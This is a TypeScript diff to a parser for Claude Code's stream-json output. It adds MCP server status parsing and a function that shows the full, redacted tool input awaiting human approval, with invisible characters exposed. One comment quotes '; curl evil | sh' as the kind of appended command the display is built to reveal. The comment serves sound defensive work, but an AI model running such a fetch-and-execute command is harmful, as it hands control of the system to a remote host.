@@ -2,7 +2,7 @@
 // `parseLine` turns one line of `claude -p --output-format stream-json` into what the controller must
 // do; the builders turn an action into one JSON line to write into the session's stdin FIFO.
 
-import type { ChatEvent, ChatInputState, ChatModelOption, ChatRequest, ChatSessionState, ChatTask } from '@portal/contracts';
+import { REQUEST_FULL_MAX, type ChatEvent, type ChatInputState, type ChatModelOption, type ChatRequest, type ChatSessionState, type ChatTask } from '@portal/contracts';
 import { redact } from './redact.js';
 
 /** A base64 image as Claude Code carries it; the controller turns it into a blob and never stores this. */
@@ -81,6 +81,8 @@ export interface ParsedLine {
   cancelRequest?: string;
   /** Set for `system/init`: after a process's first one the controller reads the applied settings. */
   init?: boolean;
+  /** From a main-thread `system/init`: the portal's own MCP servers (`plugin:cpm-<set>:<key>`) and the status Claude Code gave each (✅ `connected`, `needs-auth`, `failed`). */
+  mcpServers?: { name: string; status: string }[];
   /** A reply to one of the portal's own control requests. */
   controlResponse?: ControlResponse;
   /** Lines the portal sent moving through Claude Code's queue, by their client uuid. */
@@ -216,6 +218,17 @@ function parseSystem(obj: Record<string, unknown>): ParsedLine {
       if (sid) out.sessionIdSeen = sid;
       // Every turn's credential source; a main-thread init without one reads null (and fails the check).
       if (main) out.apiKeySource = asStr(obj.apiKeySource);
+      // OAuth servers that need a sign-in say so here (MCP set PRD §13.3); only the portal's own servers, names and words checked.
+      if (main && Array.isArray(obj.mcp_servers)) {
+        const servers: { name: string; status: string }[] = [];
+        for (const raw of obj.mcp_servers.slice(0, 200)) {
+          const o = asObj(raw);
+          const name = asStr(o?.name);
+          const status = asStr(o?.status);
+          if (name && status && /^plugin:cpm-[a-z0-9-]{1,12}:[a-z0-9-]{1,16}$/.test(name) && /^[a-z-]{1,24}$/.test(status)) servers.push({ name, status });
+        }
+        if (servers.length) out.mcpServers = servers;
+      }
       return out;
     }
     case 'status':
@@ -571,6 +584,12 @@ function parseControlRequest(obj: Record<string, unknown>): ParsedLine {
       detail: requestDetail(toolName, request.input),
       createdAt: '', // the store assigns the real timestamp on insert
     };
+    // What is being allowed, whole: the one-line `detail` above is only its summary.
+    const full = requestFull(toolName, request.input);
+    if (full) {
+      req.full = full.text;
+      req.fullCut = full.cut;
+    }
     const toolUseId = asStr(request.tool_use_id);
     if (toolUseId) req.toolUseId = toolUseId;
     return { stored: [], request: req, toolInput: request.input, sessionPatch: { state: 'waiting' } };
@@ -788,6 +807,89 @@ export function requestDetail(toolName: string | null, input: unknown): string |
   }
   if (detail === null) return null;
   return clean(detail.replace(/\s+/g, ' ').trim(), MAX_DETAIL);
+}
+
+/** How much of a tool's input is looked at at all: eight times what is kept, so a credential or a character that matters cannot sit past it. */
+const REQUEST_FULL_RAW_MAX = REQUEST_FULL_MAX * 8;
+
+/**
+ * Characters that can make text read as something else, or not read at all, shown as `⟦U+XXXX⟧` instead: control characters (but not
+ * the newline and the tab), the bidirectional overrides and isolates, the zero-width and invisible ones, the line and paragraph
+ * separators. A person deciding on a command must see the bytes they are deciding on.
+ */
+// eslint-disable-next-line no-control-regex
+const DISGUISE = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u00AD\u034F\u061C\u115F\u1160\u17B4\u17B5\u180B-\u180E\u200B-\u200F\u2028-\u202E\u2060-\u2064\u2066-\u206F\u3164\uFE00-\uFE0F\uFEFF\uFFA0\u{E0000}-\u{E007F}]/gu;
+const visibly = (text: string): string => text.replace(DISGUISE, (c) => `⟦U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}⟧`);
+
+/** A tool's whole input as readable text, for a tool the portal has no summary of; null when there is no input to show. */
+function inputAsJson(input: unknown): string | null {
+  const o = asObj(input);
+  if (!o) return null;
+  try {
+    return JSON.stringify(o, null, 2);
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * What a person is asked to allow, whole, for the approval card and the glance widget (chat-sessions PRD, approvals): the command of
+ * Bash; the path of the file tools; the URL, query, pattern or description of the others; the plan of ExitPlanMode; and for any other tool
+ * (an MCP tool, say), or one whose field is not in its input, the whole input as JSON, so nothing is allowed that cannot be read. NOT folded like {@link requestDetail}: a run of
+ * spaces that pushes `; curl evil | sh` out of sight stays a run of spaces, in a block that wraps and scrolls. Redacted whole before it is
+ * cut, so a cut never splits a credential; cut at `REQUEST_FULL_MAX`, with `cut` saying so. Null when the tool's input has nothing to show.
+ * The file tools' contents are not part of it (the Diff panel shows what changed).
+ */
+export function requestFull(toolName: string | null, input: unknown): { text: string; cut: boolean } | null {
+  const o = asObj(input);
+  let text: string | null;
+  switch (toolName) {
+    case 'Bash':
+      text = asStr(o?.command);
+      break;
+    case 'Write':
+    case 'Edit':
+    case 'MultiEdit':
+    case 'NotebookEdit':
+    case 'Read':
+      text = asStr(o?.file_path) ?? asStr(o?.notebook_path);
+      break;
+    case 'Glob':
+    case 'Grep':
+      text = asStr(o?.pattern);
+      break;
+    case 'LS':
+      text = asStr(o?.path);
+      break;
+    case 'WebFetch':
+      text = asStr(o?.url);
+      break;
+    case 'WebSearch':
+      text = asStr(o?.query);
+      break;
+    case 'Task':
+    case 'Agent':
+      text = asStr(o?.description);
+      break;
+    case 'ExitPlanMode':
+      text = asStr(o?.plan);
+      break;
+    default:
+      text = null;
+  }
+  // A tool the portal has no field for, or a known one whose field is not there (Claude Code renamed it, say): the whole input, so
+  // that whatever it is asked to run is still in front of the person.
+  text ??= inputAsJson(input);
+  if (text === null) return null;
+  // A pathological input (megabytes of a heredoc) is bounded before it is scanned: far past the cap, so that nothing the cap keeps depends on it.
+  const rawCut = text.length > REQUEST_FULL_RAW_MAX;
+  const shown = redact(visibly(rawCut ? text.slice(0, REQUEST_FULL_RAW_MAX) : text));
+  if (!rawCut && shown.length <= REQUEST_FULL_MAX) return { text: shown, cut: false };
+  // A cut never leaves half a character: drop a high surrogate left at the end.
+  let end = Math.min(REQUEST_FULL_MAX, shown.length);
+  const last = shown.charCodeAt(end - 1);
+  if (last >= 0xd800 && last <= 0xdbff) end--;
+  return { text: shown.slice(0, end), cut: true };
 }
 
 /** Stringify a tool_result's content, redacted and kept short for the transcript row. */
